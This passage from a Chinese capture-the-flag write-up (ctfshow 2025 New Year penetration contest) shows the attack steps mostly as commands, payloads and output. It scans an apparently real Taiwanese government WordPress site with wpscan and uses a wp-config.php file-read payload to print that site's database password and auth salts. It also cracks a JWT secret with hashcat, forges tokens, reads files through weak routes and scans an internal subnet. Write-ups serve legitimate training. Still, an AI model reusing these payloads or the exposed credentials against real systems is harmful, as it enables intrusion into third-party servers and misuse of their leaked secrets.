src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-201245.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">解密inputMessage_20241216:</span><br><span class="line">Park:</span><br><span class="line">你的行动已经暴露，24小时内迅速撤离，销毁所有资料，将现有资料统一上传到【任务中心】</span><br><span class="line">发送人：Dylan</span><br><span class="line"></span><br><span class="line">解密inputMessage_20240411:</span><br><span class="line">Park:</span><br><span class="line">总部已经为你安排新的身份，请务必在3日内抵台，你的新身份是新竹县动物保护防疫所网络安全顾问，【任务中心】账号密码和你任职单位网站的数据库用户名密码一致，请尽快修改 </span><br><span class="line">发送人：Dylan</span><br><span class="line"></span><br><span class="line">解密inputMessage_20240305:</span><br><span class="line">Park:</span><br><span class="line">【任务中心】网址已变更为 https://task.ctfer.com ，请注意修改浏览器地址栏中的链接 </span><br><span class="line">发送人：Dylan</span><br></pre></td></tr></table></figure><p><code>flag2：ctfshow&#123;https://task.ctfer.com&#125;</code></p><h4 id="潜入敌营"><a href="#潜入敌营" class="headerlink" title="潜入敌营"></a>潜入敌营</h4><p>这里需要<strong>账户密码</strong></p><p>通过<code>你的新身份是新竹县动物保护防疫所网络安全顾问</code>搜索网站。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://apc.hsinch*.g*v.tw/</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-211349.png"></p><p>可以看到插件是wordpress，利用kali自带<code>wpscan</code>可以扫出漏洞poc，第一次用需要注册登录官网获取token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url https://apc.hsinch*.g*v.tw/ --api_token sWXaPLV1Doham43h0uiyVIKtTAKh34kIloIo07DAIeY</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-214515.png"></p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-214607.png"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://apc.hsinch*.g*v.tw/?aam-media=wp-config.php</span><br></pre></td></tr></table></figure><p>得到数据库信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;hsinchug_wp1&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;hsinchug_wp1&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;Q.4Vyj8VCiedX1KYU5g05&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;o8wpc6n66l270a8axjrmhcy5afl8ttgf8bj9lm3hji103rchpgw88f0wuxjfcwqd&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;3jbho525q0dabjkgcpkg2yvuncwganxcjas0ikq7drgxa62my8h6tvut4a34pujx&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;1acslrj7hblucj7nnnsvi91t8v77kf8jl7omi5gfc3v8nvca46lndpchjtqd27jq&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;b6nacyj0crhfol2hs6gbqx71w957dn9al8hrjgrydf3rora6jcw2olw4sc3736aw&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;vl5vc4gy92ciqvbflfc5o4227jabrktlir61urdxal2fgl9xfokt21usbr28625v&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;7qljoppn8bcdggacnvi53616r5iyy4yr7qduyj0up3x1nv1o345t591bitfxod3a&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;g50jlcgt1qyy031blxcahqm1f20jfypw53jxxg83a67c73ir3dod3irbbguis13k&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;l5pti50j2wrxwrkclijp66x24r53auvf7kknsq7w733fr18x7my8lawm0p4hgtph&#x27;</span>);</span><br></pre></td></tr></table></figure><p>或者根据插件版本找到payload</p><p><code>flag3：ctfshow&#123;hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05&#125;</code></p><h3 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h3><h4 id="秘密潜伏"><a href="#秘密潜伏" class="headerlink" title="秘密潜伏"></a>秘密潜伏</h4><p>需要<strong>提交dylan的电话号码</strong></p><p>登录任务中心：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号：hsinchug_wp1</span><br><span class="line">密码：Q.4Vyj8VCiedX1KYU5g05</span><br><span class="line">地址：第一章潜入敌营开启的地址</span><br></pre></td></tr></table></figure><p>放了半天只看到一个照片和一串公钥：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-222023.png"></p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-222124.png"></p><p>而根据题目中提示的jwt就说的通了，key应该是密钥，我们需要伪造jwt登录dylan的账号：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-222700.png"></p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-222714.png"></p><p>利用hashcat将遮挡的字符爆破出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoc2luY2h1Z193cDEiLCJleHAiOjE3NDA2NjYyNTN9.868RYTiNArIpe3OjqMFKL9XcKzzEIjzMlagbBlw6DT0 --custom-charset1=?l?d 4a4f7d6e8b5?1?1?10c7f </span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-180440.png" alt="QQ20250227-180440"></p><p>密钥为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4a4f7d6e8b5e3a0c7f</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-181324.png"></p><p>抓显示电话号码的包修改jwt即可：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-181411.png"></p><p><code>flag4：ctfshow&#123;117447685307&#125;</code></p><h4 id="收集敌方身份信息"><a href="#收集敌方身份信息" class="headerlink" title="收集敌方身份信息"></a>收集敌方身份信息</h4><p>这里要知道<strong>root的密码</strong></p><p>知道jwt密钥后我们就可以访问<code>https://task.ctfer.com</code>，通过伪造jwt来登录dylan账号</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-194846.png"></p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-194920.png"></p><p>而在dylan账号中多了一个<code>Administrator</code>，里面有两个路由分别为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/listTaskFiles?path=</span><br><span class="line"></span><br><span class="line">/readTaskFile?path=&amp;file_name=</span><br></pre></td></tr></table></figure><p>第一个路由用于看<strong>指定目录的文件</strong>，而<strong>path参数用来指定目录</strong>：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-195259-174065751208622.png"></p><p>同样需要伪造jwt才能访问。</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-195517.png"></p><p>测试发现过滤了<code>/</code>和<code>\</code>，但没过滤<code>.</code>，所以可以<strong>通过<code>.</code>看当前目录下的文件</strong>：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-200130.png" alt="QQ20250227-200130"></p><p>而第二个路由用于<strong>看指定目录的指定文件</strong>，<strong>path指定目录，file_name指定文件</strong>：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-201124.png"></p><p>main.py.bak:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 Flask 应用的密钥，用于加密会话等</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义根路由，处理 GET 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 在会话中设置用户为 guest</span></span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查会话中的用户是否为 admin</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /key 路由，处理 GET 请求，获取特定文件中的密钥</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 尝试打开文件读取密钥</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /set_log_option 路由，处理设置日志选项的请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从请求参数中获取日志名称和日志文件名称</span></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取日志记录器并添加文件处理器</span></span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 清空日志文件内容</span></span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /get_log_content 路由，处理获取日志内容的请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从请求参数中获取日志文件名称</span></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    <span class="comment"># 拼接文件路径</span></span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空指定文件内容的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 运行 Flask 应用，开启调试模式，监听所有 IP 地址，端口为 8888</span></span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p><code>init_users.json</code>记录了所以用户名和密码：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-201358.png"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;hsinchug_wp1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hsinchug_wp1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Q.4Vyj8VCiedX1KYU5g05&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dylan&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dylan&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8f7a55c6d9a7d9a7&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;secret_user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;root&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7y.(sc#Ac_&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>flag5：ctfshow&#123;7y.(sc#Ac_&#125;</code></p><h4 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h4><p>需要<strong>提交 DATABASE_SECRET_KEY内容</strong></p><p>直接登录dylan账号，server info有内网地址：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-203047.png"></p><p>访问<code>/downloadTaskFile?url=</code>路由，用获取的IP扫c段：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250227-204411.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Database TEST<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> <span class="variable constant_">DATABASE_SECRET_KEY</span> = <span class="string">&#x27;0x8F7C71E8E82E4D1E&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to Database TEST<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is a test page for database connection and queries.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>Enter Database username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>Enter Database password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;dsn&quot;</span>&gt;</span>Enter Database DSN:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;dsn&quot;</span> <span class="attr">name</span>=<span class="string">&quot;dsn&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;query&quot;</span>&gt;</span>Enter TEST Query:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;query&quot;</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>flag6：ctfshow&#123;0x8F7C71E8E82E4D1E&#125;</code></p><h3 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h3><h4 id="跳岛战术"><a href="#跳岛战术" class="headerlink" title="跳岛战术"></a>跳岛战术</h4><p>需要<strong>拿到config.php中的数据库密码</strong></p><p>提示我们渗透进内网php服务器，而上面我们获取的服务器就是php环境，估计config.php就在这上面。</p><p>该表单接受4个参数，<code>username、password、dsn和query</code></p><p>hint:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;</span><br><span 